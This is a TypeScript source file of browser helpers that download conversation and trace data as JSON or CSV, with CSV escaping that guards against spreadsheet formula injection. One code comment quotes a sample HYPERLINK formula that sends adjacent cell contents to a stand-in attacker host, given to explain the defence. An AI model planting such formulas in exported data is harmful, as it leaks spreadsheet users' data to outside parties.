// Blob-download helpers for the Conversations / Trace / OTelTraces views
// (#1105). Keeps all the browser-only quirks in one place so the views can
// stay declarative and the helpers can be unit-tested in isolation.

// Trigger a download for an in-memory Blob via a transient <a download>
// element. Works in every browser we target; no third-party dep.
export function downloadBlob(blob: Blob, filename: string): void {
  const url = URL.createObjectURL(blob);
  try {
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    // appendChild + click so Firefox respects the download attribute.
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } finally {
    // revokeObjectURL immediately to free the URL; the browser has
    // already started the download off the in-memory blob by this point.
    // Defer one tick so Safari's download pipeline can resolve first.
    setTimeout(() => URL.revokeObjectURL(url), 0);
  }
}

// Serialise `rows` to a JSON file and download it.
export function exportJson(rows: unknown[], filename: string): void {
  const json = JSON.stringify(rows, null, 2);
  downloadBlob(new Blob([json], { type: "application/json" }), filename);
}

// Escape a single CSV cell per RFC 4180 — quote fields that contain the
// delimiter, a quote, a newline, or start/end whitespace (the last one
// avoids spreadsheet tools silently trimming). Nested quotes are doubled.
//
// #1732 — formula-injection neutralisation. Spreadsheet apps (Excel,
// LibreOffice Calc, Google Sheets) interpret a cell whose first
// character is one of `=`, `+`, `-`, `@`, tab (\t), CR (\r), LF (\n)
// as a formula. An agent-controlled message body starting with
// `=HYPERLINK("http://attacker/?leak=" & A1, "click")` would exfiltrate
// adjacent cell content the moment an operator double-clicks the
// downloaded CSV. OWASP recommends prefixing such cells with a single
// apostrophe (the spreadsheet "literal text" sigil) before any other
// quoting; we do that uniformly, then fall through to the standard
// RFC 4180 quoting so the apostrophe survives the round-trip.
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return "";
  let s: string;
  if (typeof value === "string") {
    s = value;
  } else {
    // JSON.stringify throws on cyclic payloads ("converting circular
    // structure to JSON") and on BigInt. Previously the export aborted
    // mid-row when it hit one. Fall back to String(value) so the
    // export continues with a best-effort representation of the cell
    // rather than crashing. (#1166)
    try {
      s = JSON.stringify(value);
      // JSON.stringify returns undefined for values like plain
      // functions or symbols — normalise to empty string so we never
      // feed `undefined` into the downstream string ops.
      if (s === undefined) s = "";
    } catch {
      try {
        s = String(value);
      } catch {
        s = "";
      }
    }
  }
  // Formula-injection neutralisation (#1732). Done BEFORE the quoting
  // decision so an apostrophe-prefixed cell still gets RFC 4180 quoting
  // when the underlying text contains a comma / quote / newline.
  if (s.length > 0 && /^[=+\-@\t\r\n]/.test(s)) {
    s = `'${s}`;
  }
  const needsQuoting = s.includes(",") || s.includes('"') || s.includes("\n") || s.includes("\r") || /^\s|\s$/.test(s);
  if (!needsQuoting) return s;
  return `"${s.replace(/"/g, '""')}"`;
}

// Serialise `rows` to a CSV file whose columns are the provided `columns`
// list (in order). Missing fields render as empty cells. Values are
// JSON-stringified when they aren't primitive strings so nested structures
// survive the round-trip instead of rendering as `[object Object]`.
export function exportCsv(rows: Record<string, unknown>[], columns: string[], filename: string): void {
  const header = columns.map(csvEscape).join(",");
  const body = rows.map((row) => columns.map((c) => csvEscape(row[c])).join(",")).join("\n");
  // Prepend a UTF-8 BOM so Excel on Windows opens the file as UTF-8
  // instead of Windows-1252; harmless for other consumers.
  const csv = body.length > 0 ? `${header}\n${body}\n` : `${header}\n`;
  downloadBlob(new Blob(["\ufeff", csv], { type: "text/csv;charset=utf-8" }), filename);
}

// Timestamped filename helper so export files sort chronologically in
// the user's Downloads folder without relying on filesystem mtime.
export function timestamped(prefix: string, ext: string): string {
  const d = new Date();
  const pad = (n: number): string => String(n).padStart(2, "0");
  const stamp =
    `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}` +
    `-${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
  return `${prefix}-${stamp}.${ext}`;
}
